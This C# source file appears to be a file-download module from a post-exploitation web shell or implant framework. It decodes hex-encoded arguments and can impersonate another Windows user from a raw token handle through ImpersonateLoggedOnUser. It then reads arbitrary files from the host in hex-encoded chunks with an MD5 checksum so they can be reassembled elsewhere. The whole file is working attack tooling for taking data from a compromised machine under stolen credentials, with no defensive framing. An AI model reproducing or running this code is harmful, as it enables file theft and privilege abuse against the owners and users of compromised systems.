using System;
using System.IO;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using System.Security.Cryptography;


public class Module_download
{
    public const string SUCC_CODE          = "0";
    public const string ERR_CODE           = "1";
    public const string NON_TOKEN_VALUE    = "0";
    public const string CUSTOM_SEPARATOR   = "|";
    public const int MAX_CHUNK_SIZE        = 1048576;

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    private void ImpersonateWithToken(string token)
    {
        int token_int = Int32.Parse(token);
        IntPtr targetToken = new IntPtr(token_int);

        string current_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            current_username = wid.Name;
        }

        if (!ImpersonateLoggedOnUser(targetToken))
        {
            int errorCode = Marshal.GetLastWin32Error();
            throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
        }

        string impersonate_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            impersonate_username = wid.Name;
        }

        if (current_username == impersonate_username)
            throw new Exception("ImpersonateLoggedOnUser worked, but thread running as user " + current_username);
    }

    private string hex2Str(string hex)
    {
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return Encoding.ASCII.GetString(raw);
    }

    private string normalizePath(string currPath)
    {
        currPath = currPath.Replace("\"", "");
        currPath = currPath.Replace("'", "");
        currPath = currPath.Replace(@"\", "/");
        return currPath;
    }

    private string changeCWD(string cwd)
    {
        try
        {
            Directory.SetCurrentDirectory(cwd);
            return normalizePath(Directory.GetCurrentDirectory());
        }
        catch (Exception ex)
        {
            if (ex is IOException)
                throw new Exception("Path '" + cwd + "' is not a directory");
            else if (ex is DirectoryNotFoundException)
                throw new Exception("Directory '" + cwd + "' does not exist");
            else if (ex is SecurityException)
                throw new Exception("Directory '" + cwd + "' permission denied");
            else if (ex is PathTooLongException)
                throw new Exception("Path '" + cwd + "' exceed the maximum length defined by the system");
            else
                throw new Exception("Move to path '" + cwd + "' failed");
        }
    }

    private string[] parseArguments(string args)
    {
        List<string> arguments_parsed = new List<string>();
        string pattern = @"""[^""]+""|'[^']+'|\S+";
        foreach (Match m in Regex.Matches(args, pattern))
        {
            arguments_parsed.Add(m.Value);
        }
        return arguments_parsed.ToArray();
    }

    private bool IsDirectoryWritable(string dirPath)
    {
        try
        {
            using (FileStream fs = File.Create(
                Path.Combine(
                    dirPath, 
                    Path.GetRandomFileName()
                ), 
                1,
                FileOptions.DeleteOnClose)
            )
            { }
            return true;
        }
        catch
        {
            return false;
        }
    }

    private bool isNumeric(string s)
    {
        int n;
        return int.TryParse(s, out n);
    }

    private string ByteArrayToString(byte[] ba)
    {
        StringBuilder hex = new StringBuilder(ba.Length * 2);
        foreach (byte b in ba)
            hex.AppendFormat("{0:x2}", b);
        return hex.ToString();
    }

    private byte[] readChunk(string filepath, int chunk_size, int seek)
    {
        byte[] data;
        using (FileStream stream = File.Open(filepath, FileMode.Open, FileAccess.Read))
        {
            using (BinaryReader reader = new BinaryReader(stream))
            {
                reader.BaseStream.Seek(seek, SeekOrigin.Begin);
                data = reader.ReadBytes(chunk_size);
            }
        }
        return data;
    }

    private string getMd5File(string fileName)
    {
        using (MD5 md5 = MD5.Create())
        {
            using (FileStream stream = File.OpenRead(fileName))
            {
                string checksum = BitConverter.ToString(md5.ComputeHash(stream)).Replace("-", string.Empty);
                return checksum.ToLower();
            }
        }
    }

    private string[] doDownload(string filepath, string chunk_size, string seek)
    {
        string result = "";

        try
        {
            string checksum = "";
            string normalized_path = normalizePath(filepath);

            if (File.Exists(normalized_path) == false)
                return new string[]{ERR_CODE, "can't perform stat on '" + normalized_path + "': File does not exist or permission denied" + Environment.NewLine};
            
            if (isNumeric(chunk_size) == false)
                return new string[]{ERR_CODE, "invalid chunk size '" + chunk_size + "': not a number" + Environment.NewLine};
            
            if (isNumeric(seek) == false)
                return new string[]{ERR_CODE, "invalid seek position '" + seek + "': not a number" + Environment.NewLine};

            int chunk_size_value;
            int seek_position;
            
            int.TryParse(chunk_size, out chunk_size_value);
            if (chunk_size_value > MAX_CHUNK_SIZE)
                return new string[]{ERR_CODE, "chunk size: '" + chunk_size + "' exceeds MAX_CHUNK_SIZE: '" + MAX_CHUNK_SIZE.ToString() + "'" + Environment.NewLine};

            int.TryParse(seek, out seek_position);
            FileInfo fi = new FileInfo(normalized_path);
            int file_size = (int) fi.Length;
            
            if (file_size < seek_position)
                return new string[]{ERR_CODE, "invalid seek position '" + seek + "': exceeds '" + normalized_path + "' total length '" + file_size.ToString() + "'" + Environment.NewLine};

            if ((seek_position + chunk_size_value) > file_size)
                chunk_size_value = chunk_size_value - (seek_position + chunk_size_value - file_size);
            
            byte[] chunk_data = readChunk(normalized_path, chunk_size_value, seek_position);
            int chunk_data_len = chunk_data.Length;
            string chunk_data_enc = ByteArrayToString(chunk_data);

            if ((seek_position + chunk_size_value) == file_size)
            {
                string checksum_raw = getMd5File(normalized_path);
                byte[] checksum_bytes = Encoding.UTF8.GetBytes(checksum_raw);
                checksum = ByteArrayToString(checksum_bytes);
            }
            
            result = chunk_data_enc + CUSTOM_SEPARATOR + checksum;
        }
        catch(Exception ex)
        {
            result += ex.ToString() + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }
        
        return new string[]{SUCC_CODE, result};
    }

    public string[] execute(string[] args)
    {
        string result = "";
        List<string> nargs = new List<string>(args);
		
        if (nargs.Count != 3)
        {
            result = "Invalid arguments provided. Specify a file to download, chunk size and seek" + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return doDownload(nargs[0], nargs[1], nargs[2]);
    }

    public string[] go(string cwd, string args, string token)
    {
        string[] results = new string[]{SUCC_CODE, ""};
        string pwd = Directory.GetCurrentDirectory();

        try
        {
            if (token != NON_TOKEN_VALUE)
                ImpersonateWithToken(token);

            string new_cwd = changeCWD(cwd);
            string[] arguments_parsed = parseArguments(hex2Str(args));
            
            results = execute(arguments_parsed);
        }
        catch (Exception ex)
        {
            results[0] = ERR_CODE;
            results[1] = ex.ToString();
        }
        finally
        {
            changeCWD(pwd);
            if (token != NON_TOKEN_VALUE)
                RevertToSelf();
        }
        return results;
    }

    public static void go_dm(string cwd, string args, string token)
    {
        Module_download m = new Module_download();
        String[] results = m.go(cwd, args, token);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }

    public static void Main(string[] args)
    {
        Module_download m = new Module_download();
        String[] results = m.execute(args);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }
}
